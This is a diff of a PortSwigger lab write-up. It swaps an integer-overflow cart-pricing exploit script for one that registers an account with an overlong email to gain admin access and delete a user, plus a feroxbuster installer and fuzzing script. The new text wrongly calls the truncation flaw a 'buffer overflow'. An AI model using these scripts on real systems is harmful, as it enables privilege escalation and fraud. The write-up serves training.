@@ -12,130 +12,210 @@ slug: ""
 summary: ""
 ---
 #### Entities
-Asset: https://0a4c001e030d58a4847c65e80013002f.web-security-academy.net
+Asset: https://0abf002f043f115b801d992a002a0035.web-security-academy.net
 
 #### Enumeration
 Access the lab, add the domain to Burp's Target scope and check `Include subdomains`. View `/` route source page and inspect the page, then request all embedded links via Burp proxy using the scripts below.
 
 ```python
-from bs4 import BeautifulSoup
-from urllib.parse import urljoin
-import requests
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+import os
+import platform
+import subprocess
+import sys
 
-base_url = "https://0a4c001e030d58a4847c65e80013002f.web-security-academy.net"
-proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
-content = BeautifulSoup(requests.get(base_url).text, 'html.parser')
-for link in content.find_all('a', href=True):
-  full_url = urljoin(base_url,link['href'])
-  response = requests.get(full_url, proxies=proxies, verify=False)
-  print(f"{response.status_code} {response.url}")
-for img in content.find_all('img', src=True):
-  full_url = urljoin(base_url,img['src'])
-  response = requests.get(full_url, proxies=proxies, verify=False)
-  print(f"{response.status_code} {response.url}")
+def check_binary(binary_name):
+  if sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
+    command = ['which', binary_name]
+  elif sys.platform.startswith('win'):
+    command = ['where', binary_name]
+  else:
+    print("Unsupported operating system")
+    return
+
+  try:
+    subprocess.check_output(command)
+    return True
+  except subprocess.CalledProcessError:
+    print(f"{binary_name} is not installed.")
+    return False
+
+def install_binary(binary_url, binary_name):
+  os_name = platform.system().lower()
+  binary_file = f"{binary_name}.zip" if os_name == 'windows' else f"{binary_name}.tar.gz"
+  
+  # Check if binary exists
+  if not check_binary(binary_name):
+    # Download Binary File if not exist
+    if not os.path.exists(binary_file):
+      if os_name == 'linux':
+        download_command = f"curl -L {binary_url}/x86_64-linux-{binary_name}.tar.gz -o {binary_file}"
+      elif os_name == 'darwin':
+        download_command = f"curl -L {binary_url}/x86_64-macos-{binary_name}.tar.gz -o {binary_file}"
+      elif sys.platform.startswith('win'):
+        download_command = f"powershell -Command 'Invoke-WebRequest {binary_url}/x86_64-windows-{binary_name}.exe.zip -OutFile {binary_file}'"
+      else:
+        print("Unsupported operating system")
+        return
+
+      try:
+        subprocess.run(download_command, shell=True, check=True)
+        print(f"{binary_name} downloaded successfully")
+      except subprocess.CalledProcessError as e:
+        print(f"Failed to download {binary_name}: {e}")
+
+    # Install Binary
+    if os.path.exists(binary_file):
+      if os_name in ['linux', 'darwin']:
+        extract_command = f"sudo tar -C /usr/local/bin/ -xzf {binary_file} {binary_name} && sudo chmod 775 /usr/local/bin/{binary_name}"
+      elif sys.platform.startswith('win'):
+        extract_command = f"Powershell -Command \"Expand-Archive -Path {binary_file} -DestinationPath . ; Move-Item -Path .\\{binary_name}.exe -Destination 'C:\\Windows\\'\""
+      else:
+        print("Unsupported operating system")
+        return
+
+      try:
+        subprocess.run(extract_command, shell=True, check=True)
+        print(f"{binary_name} installed successfully")
+      except subprocess.CalledProcessError as e:
+        print(f"Failed to install {binary_name}: {e}")
+
+      # Clean up downloaded binary file
+      try:
+        cleanup_command = f"rm {binary_file}" if os_name != 'windows' else f"del {binary_file}"
+        subprocess.run(cleanup_command, shell=True, check=True)
+        print(f"Cleaned up {binary_file}")
+      except subprocess.CalledProcessError as e:
+        print(f"Failed to clean up {binary_file}: {e}")
+  else:
+    print(f"{binary_name} is already installed.")
+
+def enumerate_path(endpoint, wordlist_path):
+  print("Enumerating paths...")
+  fuzz_command = f"feroxbuster -u {endpoint} -w {wordlist_path} -C 404 --proxy http://127.0.0.1:8080 --insecure --quiet --no-state --auto-tune"
+  process = subprocess.Popen(fuzz_command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+  for line in process.stdout:
+    print(line.strip())
+
+def main():
+  binary_url = "https://github.com/epi052/feroxbuster/releases/download/v2.10.2"
+  binary_name = "feroxbuster"
+  endpoint = "https://0abf002f043f115b801d992a002a0035.web-security-academy.net/"
+  wordlist_path = "wordlist.txt"
+  install_binary(binary_url, binary_name)
+  enumerate_path(endpoint, wordlist_path)
+
+if __name__ == "__main__":
+  main()
+```
+The custom word list used for the above enumeration.
+```text
+accounts
+admin
+administrator
+api
+users
+products
+product
 ```
 
 ![Enumeration](/images/bizlogic6/01-enumerate-inconsistent-handling-of-exceptional-input.png "Enumeration")  
 
 #### Exploration
-Stacking BurpSuite and the Browser with FoxyProxy extension for Burp turned on, perform a user flow for purchasing an item after logging in with the provided user credential  `wiener:peter`.  The `/login` when requested with valid credentials makes a POST request with `csrf`, `username` and `password` parameters. 
+Stacking BurpSuite and the Browser with FoxyProxy extension for Burp turned on, explore the application by registering an account and logging into the application. Observe that there is no email update feature. 
 
 ![Exploration](/images/bizlogic6/02-explore-inconsistent-handling-of-exceptional-input.png "Exploration") 
 
 #### Exploitation
-Observe a POST request  to `/cart`  with `productId`,`redir`, and `quantity` parameters. When we can manipulate the `quantity` parameter we notice that we can purchase absurd number of items which causes an [integer overflow](https://www.invicti.com/learn/integer-overflow/) at some point. We exploit this by tactically by adding various item to force the total price below the store credit. Doing this manually is extremely laborious thus exploit it using the script below
+We can explore [buffer overflow]() to force our email to have the `@dontwannacry.com` email host after which the 'Admin Panel' tab becomes active. Click on it then delete the Carlos user. This exploit can be automated with the script below
 ```python
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin
+from urllib.parse import urlparse
 import requests
+import random
+import string
 import urllib3
-
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Define Variables
-base_url = 'https://0a4c001e030d58a4847c65e80013002f.web-security-academy.net/'
+class SiteInteraction:
+  def __init__(self, base_url, proxies=None):
+    self.base_url = base_url
+    self.session = requests.Session()
+    self.session.proxies = proxies if proxies else {}
+
+  def get_csrf_token(self, url):
+    response = self.session.get(url, verify=False)
+    soup = BeautifulSoup(response.content, 'html.parser')
+    csrf_token = soup.find('input', {'name': 'csrf'})['value']
+    return csrf_token
+  
+  def get_email_url(self):
+    response = self.session.get(self.base_url, verify=False)
+    email_client_url = BeautifulSoup(response.content, 'html.parser').find('a', {'id': 'exploit-link'}).get('href')
+    return email_client_url
+  
+  def generate_email(self):
+    emailhost = '@dontwannacry.com.' + urlparse(self.get_email_url()).hostname
+    chars = 238
+    email = ''.join(random.choices(string.ascii_letters + string.digits, k=chars))
+    return email + emailhost
+
+  def register(self, username, password):
+    register_url = self.base_url + '/register'
+    csrf_token = self.get_csrf_token(register_url)
+    data = {
+      'username': username,
+      'email': self.generate_email(),
+      'password': password,
+      'csrf': csrf_token
+    }
+    response = self.session.post(register_url, data=data, verify=False)
+    return response
+
+  def email_activation(self):
+    response = self.session.get(self.get_email_url(), verify=False)
+    soup = BeautifulSoup(response.content, 'html.parser')
+    activation_link = soup.find('a', href=True, string=lambda text: text and "temp-registration-token" in text)['href']
+    activation_response = self.session.get(activation_link, verify=False)
+    return activation_response
+
+  def login(self, username, password):
+    login_url = self.base_url + '/login'
+    csrf_token = self.get_csrf_token(login_url)
+    data = {
+      'username': username,
+      'password': password,
+      'csrf': csrf_token
+    }
+    response = self.session.post(login_url, data=data, verify=False)
+    return response
+
+  def delete_user(self, username):
+    admin_delete_url = self.base_url + f'/admin/delete?username={username}'
+    response = self.session.get(admin_delete_url, verify=False)
+    return response
+
+# Example usage:
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+url = 'https://0abf002f043f115b801d992a002a0035.web-security-academy.net'
+site = SiteInteraction(url, proxies=proxies)
+username = 'attacker'
+password = 'P@7sW0)d'
 
-# Get CSRF Token
-def get_csrf_token(session, url):
-  response = session.get(url, proxies=proxies, verify=False)
-  csrf_token = BeautifulSoup(response.text, 'html.parser').find('input', {'name': 'csrf'}).get('value')
-  return csrf_token
+# Register a user
+registration_response = site.register(username, password)
+print("Registration response:", registration_response.status_code)
 
-# Get Items Total Price
-def get_total(session):
-  cart_url = urljoin(base_url, 'cart')
-  response = session.get(cart_url, proxies=proxies, verify=False)
-  soup = BeautifulSoup(response.content, 'html.parser')
-  total_element = soup.find('th', string='Total:')
-  if total_element:
-    total_text = total_element.find_next_sibling('th').text
-    total_value = total_text.replace('$', '')
-    return float(total_value)
-  else:
-    return None
+# Activate email
+email_activation_response = site.email_activation()
+print("Email activation response:", email_activation_response.status_code)
 
-# Purchase Item
-def purchase_item(session, url):
-  # Login
-  login_url = urljoin(base_url, 'login')
-  login_csrf_token = get_csrf_token(session, login_url)
-  login_payload = {'username': 'wiener', 'password': 'peter', 'csrf': login_csrf_token}
-  login_response = session.post(login_url, data=login_payload, proxies=proxies, verify=False)
+# Login
+login_response = site.login(username, password)
+print("Login response:", login_response.status_code)
 
-  if login_response.status_code == 200:
-    cart_url = urljoin(base_url, 'cart')
-    
-    while True:
-      # Add first item
-      cart_payload1 = {'productId': '1', 'redir': 'PRODUCT', 'quantity': '99'}
-      session.post(cart_url, data=cart_payload1, proxies=proxies, verify=False)
-
-      # Check total
-      total = get_total(session)
-      if -70000 < total < 0:
-        break
-
-    while True:
-      # Add second item
-      cart_payload2 = {'productId': '2', 'redir': 'PRODUCT', 'quantity': '58'}
-      session.post(cart_url, data=cart_payload2, proxies=proxies, verify=False)
-
-      # Check total again
-      total = get_total(session)
-      if -4000 < total < 100:
-        break
-
-    while True:
-      # Add third item
-      cart_payload3 = {'productId': '3', 'redir': 'PRODUCT', 'quantity': '17'}
-      session.post(cart_url, data=cart_payload3, proxies=proxies, verify=False)
-
-      # Check total again
-      total = get_total(session)
-      if 0 < total < 100:
-        # Checkout
-        checkout_url = urljoin(base_url, 'cart/checkout')
-        checkout_csrf_token = get_csrf_token(session, cart_url)
-        checkout_payload = {'csrf': checkout_csrf_token}
-        checkout_response = session.post(checkout_url, data=checkout_payload, proxies=proxies, verify=False)
-        if checkout_response.status_code == 200:
-          print("Purchase successful!")
-        else:
-          print("Failed to checkout.")
-        break
-
-  else:
-    print("Failed to log in.")
-
-def main():
-  session = requests.Session()
-  purchase_item(session, base_url)
-
-if __name__ == "__main__":
-  main()
+# Delete user
+delete_user_response = site.delete_user('carlos')
+print("Delete user response:", delete_user_response.status_code)
 ```
 ![Exploitation](/images/bizlogic6/03-exploit-inconsistent-handling-of-exceptional-input.png "Exploitation") 
 
